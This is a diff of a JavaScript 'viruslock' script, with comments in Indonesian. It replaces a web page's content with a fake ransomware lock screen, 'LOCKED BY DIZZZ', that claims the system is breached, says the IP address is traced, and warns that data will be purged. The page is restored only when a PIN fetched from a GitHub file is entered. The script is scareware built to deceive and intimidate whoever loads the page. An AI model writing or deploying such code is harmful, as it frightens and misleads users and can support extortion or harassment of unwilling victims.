@@ -1,63 +1,128 @@
+iscoredetected = null;
 (async function() {
-    // 1. URL Raw GitHub kamu (Ganti dengan URL punyamu)
+    // 1. Konfigurasi URL GitHub
     const urlGithub = 'https://raw.githubusercontent.com/kenzz-sz/Zynx_mod/refs/heads/main/mods/viruslock/pin.txt';
     
-    // 2. Simpan konten asli dan hapus dari tampilan
+    // 2. Simpan data asli
     const originalContent = document.body.innerHTML;
     const originalStyle = document.body.style.cssText;
-    
-    document.body.innerHTML = '';
-    document.body.style.backgroundColor = '#1a1a1a';
-    document.body.style.display = 'flex';
-    document.body.style.flexDirection = 'column';
-    document.body.style.justifyContent = 'center';
-    document.body.style.alignItems = 'center';
-    document.body.style.height = '100vh';
-    document.body.style.color = 'white';
-    document.body.style.fontFamily = 'Arial, sans-serif';
+    const originalTitle = document.title;
 
-    // 3. Buat UI Input
-    document.body.innerHTML = `
-        <div style="text-align: center;">
-            <h2>LOCKED BY DIZZZ</h2>
-            <p>Input pin here :</p>
-            <input type="password" id="pinInput" style="padding: 10px; border-radius: 5px; border: none; outline: none; text-align: center; font-size: 1.2rem;">
-            <br><br>
-            <button id="unlockBtn" style="padding: 10px 20px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px;">ENTER</button>
-            <p id="pesan" style="color: #ff4d4d; margin-top: 10px;"></p>
+    // 3. Setup Lingkungan "Gelap"
+    document.title = "FATAL ERROR: SYSTEM BREACHED";
+    document.body.innerHTML = '';
+    document.body.style.cssText = `
+        margin: 0;
+        padding: 0;
+        background: #000 !important;
+        background-image: none !important;
+        height: 100vh;
+        width: 100vw;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        overflow: hidden;
+        font-family: 'Courier New', Courier, monospace;
+        color: #ff0000;
+        text-shadow: 0 0 5px #ff0000;
+    `;
+
+    // 4. Bangun UI yang lebih Dark & Kompleks
+    const container = document.createElement('div');
+    container.style.cssText = `
+        text-align: left;
+        max-width: 500px;
+        width: 90%;
+        border-left: 2px solid #ff0000;
+        padding: 20px 40px;
+        background: rgba(10, 0, 0, 0.9);
+    `;
+
+    container.innerHTML = `
+        <h1 style="font-size: 1.5rem; letter-spacing: 5px; margin-bottom: 5px; color: #fff;">[ LOCKED BY DIZZZ ]</h1>
+        <div style="font-size: 0.8rem; margin-bottom: 20px; opacity: 0.7; border-bottom: 1px solid #330000; padding-bottom: 10px;">
+            SYSTEM STATUS: ENCRYPTED<br>
+            UNAUTHORIZED ACCESS DETECTED: ${new Date().toLocaleString()}<br>
+            IP_ADDRESS: TRACED_BY_DIZZZ
+        </div>
+        
+        <p style="font-size: 0.9rem; color: #ccc;">Your files are still there, but you can't see them. Input the decryption key to restore access.</p>
+        
+        <div style="margin-top: 30px;">
+            <input type="password" id="pinInput" placeholder="KEY_REQUIRED" autocomplete="off"
+                style="width: 100%; background: transparent; border: 1px solid #440000; color: #ff0000; padding: 12px; font-family: monospace; outline: none; box-sizing: border-box; transition: 0.3s; font-size: 1rem;">
+            
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 20px;">
+                <span id="pesan" style="font-size: 0.75rem; color: #ff0000; text-transform: uppercase;">Awaiting credentials...</span>
+                <button id="unlockBtn" style="background: transparent; border: 1px solid #ff0000; color: #ff0000; padding: 8px 25px; cursor: pointer; font-family: monospace; font-weight: bold; transition: 0.3s; text-transform: uppercase;">Restore</button>
+            </div>
+        </div>
+
+        <div style="margin-top: 50px; font-size: 0.6rem; color: #440000; text-align: center;">
+            DO NOT REFRESH THIS PAGE OR DATA WILL BE PURGED.
         </div>
     `;
 
-    // 4. Fungsi Verifikasi
-    async function checkPin() {
+    document.body.appendChild(container);
+
+    // Efek Hover Button (Tidak Lebay)
+    const btn = document.getElementById('unlockBtn');
+    btn.onmouseover = () => { btn.style.background = '#ff0000'; btn.style.color = '#000'; };
+    btn.onmouseout = () => { btn.style.background = 'transparent'; btn.style.color = '#ff0000'; };
+
+    // 5. Logika Verifikasi
+    async function verifyAccess() {
         const inputUser = document.getElementById('pinInput').value;
         const pesan = document.getElementById('pesan');
+        
+        if (!inputUser) return;
 
         try {
-            pesan.innerText = "Memverifikasi...";
-            const response = await fetch(urlGithub);
-            const pinBenar = (await response.text()).trim();
+            pesan.innerText = "> DECRYPTING...";
+            pesan.style.color = "#fff";
 
-            if (inputUser === pinBenar) {
-                // Kembalikan konten asli
-                document.body.style.cssText = originalStyle;
-                document.body.innerHTML = originalContent;
-                console.log("%c Akses Diterima! ", "background: #28a745; color: white; font-size: 15px;");
-            } else {
-                pesan.innerText = "PIN Salah! Coba lagi.";
-                document.getElementById('pinInput').value = '';
-            }
+            const response = await fetch(urlGithub);
+            const rawPin = await response.text();
+            const pinBenar = rawPin.trim();
+
+            // Delay sedikit untuk efek "proses"
+            setTimeout(() => {
+                if (inputUser === pinBenar) {
+                    pesan.innerText = "> ACCESS_GRANTED";
+                    pesan.style.color = "#00ff00";
+                    
+                    // Efek Fade Out sebelum kembali ke asal
+                    container.style.transition = "opacity 1s";
+                    container.style.opacity = "0";
+                    
+                    setTimeout(() => {
+                        document.body.style.cssText = originalStyle;
+                        document.body.innerHTML = originalContent;
+                        document.title = originalTitle;
+                        console.clear();
+                        console.log("%c SYSTEM RESTORED ", "background: #00ff00; color: #000; font-weight: bold;");
+                    }, 1000);
+                } else {
+                    pesan.innerText = "> ERROR: WRONG_KEY";
+                    pesan.style.color = "#ff0000";
+                    document.getElementById('pinInput').value = '';
+                    // Efek shake singkat
+                    container.style.transform = "translateX(5px)";
+                    setTimeout(() => container.style.transform = "translateX(0)", 100);
+                }
+            }, 800);
+
         } catch (error) {
-            pesan.innerText = "Gagal mengambil data dari GitHub.";
-            console.error(error);
+            pesan.innerText = "> CONNECTION_FAILED";
+            console.error("Critical Error:", error);
         }
     }
 
-    // Event Listener
-    document.getElementById('unlockBtn').onclick = checkPin;
+    // Event Listeners
+    btn.onclick = verifyAccess;
     document.getElementById('pinInput').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') checkPin();
+        if (e.key === 'Enter') verifyAccess();
     });
 
-    console.log("%c Halaman telah dikunci oleh script. ", "background: #ffc107; color: black;");
+    console.log("%c WARNING: NO ESCAPE ", "background: red; color: white; font-size: 20px;");
 })();
